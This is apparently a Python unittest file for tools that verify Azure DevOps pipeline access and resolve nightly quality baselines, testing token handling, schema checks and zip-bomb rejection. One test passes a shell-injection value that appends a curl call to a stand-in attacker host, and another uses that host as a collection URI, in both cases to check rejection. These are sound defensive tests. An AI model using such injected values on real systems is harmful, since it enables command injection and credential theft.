from __future__ import annotations

import io
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
EVAL_TOOLS = ROOT / "tools" / "evals"
sys.path.insert(0, str(EVAL_TOOLS))

from verify_azure_pipeline_access import (  # noqa: E402
    AzureAccessError,
    verify_pipeline_access,
)
from resolve_azure_baseline import resolve_baseline  # noqa: E402
from download_quality_history import extract_zip_safely  # noqa: E402


class AzureSetupVerificationTests(unittest.TestCase):
    @staticmethod
    def bootstrap_baseline() -> dict:
        return {
            "schema_version": 1,
            "version": "1.0.0",
            "status": "bootstrap",
            "baseline_commit": "not_available",
            "created_at": None,
            "accepted_run": None,
            "capabilities": {},
            "scenarios": {},
        }

    def test_first_run_resolves_bootstrap_without_a_warning_state(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bootstrap = root / "bootstrap.json"
            output = root / "resolved.json"
            bootstrap.write_text(json.dumps(self.bootstrap_baseline()), encoding="utf-8")

            report = resolve_baseline(
                collection_uri="https://dev.azure.com/example/",
                project="project-id",
                definition_id="42",
                token="secret-system-token",
                bootstrap=bootstrap,
                output=output,
                requester=lambda url, token: {"count": 0, "value": []},
            )

            self.assertEqual(report["source"], "bootstrap")
            self.assertEqual(json.loads(output.read_text(encoding="utf-8"))["status"], "bootstrap")

    def test_resolves_latest_nightly_baseline_artifact(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bootstrap = root / "bootstrap.json"
            output = root / "resolved.json"
            bootstrap.write_text(json.dumps(self.bootstrap_baseline()), encoding="utf-8")
            archive_buffer = io.BytesIO()
            with zipfile.ZipFile(archive_buffer, "w") as archive:
                archive.writestr(
                    "last-green-baseline.json",
                    json.dumps({
                        "schema_version": 1,
                        "version": "1.0.0",
                        "status": "accepted",
                        "baseline_commit": "abcdef1",
                        "created_at": "2026-08-29T00:00:00Z",
                        "accepted_run": {"id": "9001", "branch": "main", "profile": "full"},
                        "capabilities": {},
                        "scenarios": {},
                    }),
                )

            def request(url: str, token: str) -> dict:
                if "/artifacts?" in url:
                    return {"value": [{
                        "name": "last-green-baseline",
                        "resource": {"downloadUrl": "https://artifacts.example/baseline.zip"},
                    }]}
                return {"count": 1, "value": [{"id": 9001}]}

            report = resolve_baseline(
                collection_uri="https://dev.azure.com/example/",
                project="project-id",
                definition_id="42",
                token="secret-system-token",
                bootstrap=bootstrap,
                output=output,
                requester=request,
                downloader=lambda url, token, origin: archive_buffer.getvalue(),
            )

            self.assertEqual(report["source"], "accepted-nightly")
            self.assertEqual(report["build_id"], 9001)
            self.assertEqual(json.loads(output.read_text(encoding="utf-8"))["status"], "accepted")

    def test_rejects_invalid_baseline_schema_and_zip_bombs(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bootstrap = root / "bootstrap.json"
            output = root / "resolved.json"
            bootstrap.write_text(json.dumps(self.bootstrap_baseline()), encoding="utf-8")
            invalid = io.BytesIO()
            with zipfile.ZipFile(invalid, "w") as archive:
                archive.writestr("last-green-baseline.json", json.dumps({"status": "accepted"}))

            def request(url: str, token: str) -> dict:
                if "/artifacts?" in url:
                    return {"value": [{
                        "name": "last-green-baseline",
                        "resource": {"downloadUrl": "https://artifacts.example/baseline.zip"},
                    }]}
                return {"count": 1, "value": [{"id": 9001}]}

            with self.assertRaises(AzureAccessError):
                resolve_baseline(
                    collection_uri="https://dev.azure.com/example/",
                    project="project-id",
                    definition_id="42",
                    token="secret-system-token",
                    bootstrap=bootstrap,
                    output=output,
                    requester=request,
                    downloader=lambda url, token, origin: invalid.getvalue(),
                )

            bomb = io.BytesIO()
            with zipfile.ZipFile(bomb, "w", compression=zipfile.ZIP_DEFLATED) as archive:
                archive.writestr("large.txt", b"0" * 2_000_000)
            with zipfile.ZipFile(io.BytesIO(bomb.getvalue())) as archive:
                with self.assertRaises(ValueError):
                    extract_zip_safely(archive, root / "extract")

    def test_verifies_nightly_definition_and_history_read_without_exposing_token(self) -> None:
        seen_urls: list[str] = []

        def request(url: str, token: str) -> dict:
            seen_urls.append(url)
            self.assertEqual(token, "secret-system-token")
            if "/definitions/42" in url:
                return {
                    "id": 42,
                    "name": "Agent Commons - Nightly Quality",
                    "process": {"yamlFilename": ".azuredevops/commons-nightly-quality.yml"},
                }
            return {"count": 1, "value": [{"id": 9001, "result": "succeeded"}]}

        report = verify_pipeline_access(
            collection_uri="https://dev.azure.com/example/",
            project="project-id",
            definition_id="42",
            expected_yaml_path=".azuredevops/commons-nightly-quality.yml",
            token="secret-system-token",
            requester=request,
        )

        self.assertEqual(report["definition_id"], 42)
        self.assertEqual(report["yaml_path"], ".azuredevops/commons-nightly-quality.yml")
        self.assertEqual(report["history_builds_visible"], 1)
        self.assertNotIn("secret-system-token", str(report))
        self.assertTrue(any("statusFilter=completed" in url for url in seen_urls))

    def test_rejects_a_definition_for_the_wrong_yaml_file(self) -> None:
        def request(url: str, token: str) -> dict:
            return {
                "id": 7,
                "name": "Wrong pipeline",
                "process": {"yamlFilename": ".azuredevops/commons-main-validation.yml"},
            }

        with self.assertRaises(AzureAccessError):
            verify_pipeline_access(
                collection_uri="https://dev.azure.com/example/",
                project="project-id",
                definition_id="7",
                expected_yaml_path=".azuredevops/commons-nightly-quality.yml",
                token="secret-system-token",
                requester=request,
            )

    def test_rejects_non_numeric_definition_before_any_azure_request(self) -> None:
        requested = False

        def request(url: str, token: str) -> dict:
            nonlocal requested
            requested = True
            return {}

        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            bootstrap = root / "bootstrap.json"
            bootstrap.write_text(json.dumps(self.bootstrap_baseline()), encoding="utf-8")
            with self.assertRaises(AzureAccessError):
                resolve_baseline(
                    collection_uri="https://dev.azure.com/example/",
                    project="project-id",
                    definition_id="42'; curl https://attacker.example #",
                    token="secret-system-token",
                    bootstrap=bootstrap,
                    output=root / "resolved.json",
                    requester=request,
                )

        self.assertFalse(requested)

    def test_rejects_non_azure_collection_origin_before_any_request(self) -> None:
        requested = False

        def request(url: str, token: str) -> dict:
            nonlocal requested
            requested = True
            return {}

        with self.assertRaises(AzureAccessError):
            verify_pipeline_access(
                collection_uri="https://attacker.example/organization/",
                project="project-id",
                definition_id="42",
                expected_yaml_path=".azuredevops/commons-nightly-quality.yml",
                token="secret-system-token",
                requester=request,
            )

        self.assertFalse(requested)


if __name__ == "__main__":
    unittest.main()
